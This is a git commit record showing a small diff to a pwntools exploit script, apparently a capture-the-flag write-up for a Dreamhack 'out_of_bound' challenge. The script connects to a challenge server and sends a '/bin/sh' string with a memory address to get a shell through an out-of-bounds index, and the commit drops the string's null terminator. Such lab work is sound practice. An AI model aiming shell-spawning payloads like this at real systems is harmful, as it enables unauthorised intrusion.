10777e26f1567354dc9c23051febeb803088f5e9
NULLNULLpersid <persid@cu.ac.kr>
2024-08-17 06:09:57 +0900

    완료

--- System/LEVEL1/out_of_bound/Write-up/out_of_bound.py
+++ System/LEVEL1/out_of_bound/Write-up/out_of_bound.py
@@ -2,7 +2,7 @@ from pwn import *
 
 p = remote("host3.dreamhack.games", 20551)
 
-payload = b'/bin/sh\x00' + b'\xac\xa0\x04\x08'
+payload = b'/bin/sh' + b'\xac\xa0\x04\x08'
 
 p.sendline(payload)
 p.sendline(b'21')
